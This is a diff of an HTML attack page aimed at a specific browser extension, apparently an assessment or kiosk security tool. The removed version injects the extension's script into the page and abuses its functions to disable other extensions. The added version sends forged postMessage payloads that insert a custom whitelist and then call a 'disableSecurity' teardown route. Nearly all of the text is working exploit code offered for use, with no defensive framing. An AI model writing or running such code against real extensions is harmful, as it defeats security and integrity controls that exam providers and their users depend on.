@@ -1,142 +1,86 @@
-<!DOCTYPE html>
+data:text/html;charset=utf-8,<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Assessment Security Control Panel</title>
+    <title>Integrated Framework Control Panel</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 40px; background: #fafafa; color: #333; }
-        .box { background: #fff; padding: 25px; border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 550px; margin: 0 auto; }
-        h2 { color: #e04f5f; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px; margin-top: 0; }
-        .list-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f9f9f9; }
-        .btn { background: #4a90e2; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 15px; cursor: pointer; margin-bottom: 15px; font-weight: bold; }
-        .btn-danger { background: #e04f5f; }
-        .status-msg { margin: 15px 0; font-weight: bold; color: #2ecc71; text-align: center; }
-        small { color: #888; }
+        body { font-family: Arial, sans-serif; margin: 40px; background: #f4f6f9; color: #333; }
+        .panel { max-width: 500px; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin: 0 auto; }
+        h2 { color: #d9534f; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-top: 0; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #d9534f; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background: #c9302c; }
+        #status-log { margin-top: 15px; font-weight: bold; color: #5cb85c; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>System Defense Bypasser (Confused Deputy Control)</h2>
-    <p>Select which extensions you want to <strong>KEEP ALIVE</strong> (Allowed Whitelist). Anything unchecked will be forcefully disabled by the extension.</p>
+<div class="panel">
+    <h2>Chained Security Override Panel</h2>
+    <p>Inject custom identifiers into the active extension profile and trigger the environment teardown route automatically.</p>
     
-    <!-- Step 1 Button -->
-    <button class="btn" id="initiate-scan">1. Scan Browser for Extensions</button>
+    <div class="input-group">
+        <label for="target-id">Extension ID to Keep Alive:</label>
+        <input id="target-id" type="text" placeholder="abcdefghijklmnopqrstuvwxyzabcdef" value="ikhaeihjaaefmpnkejamfkbddfemnfbm">
+    </div>
     
-    <!-- Dynamic List Container -->
-    <div id="display-area"></div>
-    
-    <!-- Step 2 Button -->
-    <button class="btn btn-danger" id="execute-strike" style="display:none;">2. Apply Target Strike</button>
-    
-    <!-- Status Display -->
-    <div class="status-msg" id="log-status"></div>
+    <button class="btn" id="execute-bypass">Execute Chained Bypass</button>
+    <div id="status-log">Ready.</div>
 </div>
 
 <script>
-    const TARGET_EXTENSION_ID = "ikhaeihjaaefmpnkejamfkbddfemnfbm";
-    let extractedExtensions = [];
-
-    // --- IMMEDATELY BYPASS ISOLATION ON PAGE LOAD ---
-    // Forcefully inject the extension's core file into the webpage's main execution context
-    (function bypassIsolation() {
-        console.log("Attempting isolation bypass via web_accessible_resources...");
-        const scriptElement = document.createElement('script');
-        scriptElement.src = `chrome-extension://${TARGET_EXTENSION_ID}/app_security.min.js`;
+    document.getElementById('execute-bypass').addEventListener('click', () => {
+        const customId = document.getElementById('target-id').value.trim();
+        const status = document.getElementById('status-log');
         
-        scriptElement.onload = function() {
-            console.log("✅ Isolation Bypassed: SecurityServices loaded into Main World.");
-            document.getElementById('log-status').innerText = "Extension hooked successfully. Ready to scan.";
-        };
-        
-        scriptElement.onerror = function() {
-            console.error("❌ Bypass Failed: Check extension ID or web_accessible_resources configuration.");
-            document.getElementById('log-status').style.color = "#e04f5f";
-            document.getElementById('log-status').innerText = "Failed to hook extension. Ensure ID is correct.";
-        };
-        
-        document.head.appendChild(scriptElement);
-    })();
-
-    // --- PHASE 1: Hooking the Interceptor and Collecting Extensions ---
-    document.getElementById('initiate-scan').addEventListener('click', async () => {
-        const area = document.getElementById('display-area');
-        area.innerHTML = "<em>Analyzing extension execution tables...</em>";
-
-        if (typeof SecurityServices !== 'undefined') {
-            // Force reset the whitelist memory inside the hooked instance
-            SecurityServices.securityConfig = { allowedExtensions: [] };
-
-            // Intercept internal telemetry data emitted by the Disable function
-            SecurityServices.SetLogger(function(actionContext, telemetryData) {
-                if (telemetryData && telemetryData.id && telemetryData.name) {
-                    if (!extractedExtensions.some(item => item.id === telemetryData.id)) {
-                        extractedExtensions.push(telemetryData);
-                    }
-                }
-            });
-
-            // Trigger the internal management routine to build the inventory
-            await SecurityServices.DisableOtherExtensions();
-
-            // Instantly trigger re-enablement so protective layers aren't dropped prematurely
-            await SecurityServices.ReEnableExtensions();
-
-            // Render the control switches
-            populateUI();
-        } else {
-            area.innerHTML = "<span style='color:#e04f5f;'>Runtime Error: SecurityServices object not found. Ensure the extension is installed and your page host satisfies match requirements.</span>";
-        }
-    });
-
-    // --- PHASE 2: Rendering the UI Toggles ---
-    function populateUI() {
-        const area = document.getElementById('display-area');
-        area.innerHTML = "";
-
-        if (extractedExtensions.length === 0) {
-            area.innerHTML = "No third-party extensions discovered.";
+        if (!customId) {
+            status.innerText = "Error: Please provide a valid Extension ID.";
+            status.style.color = "#d9534f";
             return;
         }
 
-        extractedExtensions.forEach(extension => {
-            const row = document.createElement('div');
-            row.className = 'list-item';
-            row.innerHTML = `
-                <div>
-                    <strong>${extension.name}</strong><br>
-                    <small>ID: ${extension.id}</small>
-                </div>
-                <input type="checkbox" class="strike-toggle" data-target-id="${extension.id}" checked>
-            `;
-            area.appendChild(row);
-        });
+        status.style.color = "#5cb85c";
+        status.innerText = "Phase 1: Transmitting custom Application Whitelist…";
 
-        document.getElementById('execute-strike').style.display = "block";
-        document.getElementById('log-status').innerText = `Discovered ${extractedExtensions.length} extension profiles.`;
-    }
-
-    // --- PHASE 3: Executing the Targeted Configuration Strike ---
-    document.getElementById('execute-strike').addEventListener('click', async () => {
-        const checkboxes = document.querySelectorAll('.strike-toggle');
-        const modifiedWhitelist = [];
-
-        // Any extension the user leaves checked stays alive. Unchecked extensions get disabled.
-        checkboxes.forEach(box => {
-            if (box.checked) {
-                modifiedWhitelist.push(box.getAttribute('data-target-id'));
+        // — PHASE 1: Manipulating the State Config —
+        // Mirroring the exact structure needed by updateKioskConfigFromManifest()
+        const statePayload = {
+            source: "PWA",
+            type: "sendMessage",
+            message: {
+                action: "setConfiguration", // Routes to the manifest parsing loop
+                Configuration: {
+                    // Injecting our custom tools straight into the whitelist merger loop
+                    ApplicationWhitelist: customId,
+                    DomainWhitelist: window.location.hostname,
+                    URL: window.location.href
+                },
+                Properties: {
+                    CRX_VIOLATION_ACCEPETED_ATTEMPT: 99999
+                }
             }
-        });
+        };
 
-        document.getElementById('log-status').innerText = "Transmitting modified security arrays...";
+        // Broadcast to the Content Bridge relay
+        window.postMessage(JSON.stringify(statePayload), "*");
 
-        // Overwrite active runtime parameters inside the dynamic memory scope
-        SecurityServices.securityConfig.allowedExtensions = modifiedWhitelist;
+        // — PHASE 2: Triggering the Environmental Teardown —
+        setTimeout(() => {
+            status.innerText = "Phase 2: Triggering disableSecurity routine…";
+            
+            const teardownPayload = {
+                source: "PWA",
+                type: "sendMessage",
+                message: {
+                    action: "disableSecurity" // Triggers the previously discovered cleanup route
+                }
+            };
 
-        // Force execution a second time with the modified custom configuration
-        const runtimeResponse = await SecurityServices.DisableOtherExtensions();
-        
-        document.getElementById('log-status').innerText = `Strike complete. Disabled ${runtimeResponse.disabled.length} targeted protection layers.`;
+            window.postMessage(JSON.stringify(teardownPayload), "*");
+            status.innerText = "Chained execution payload broadcast complete.";
+        }, 1000); // 1-second delay ensures the state finishes processing in the backend worker first
     });
 </script>
 
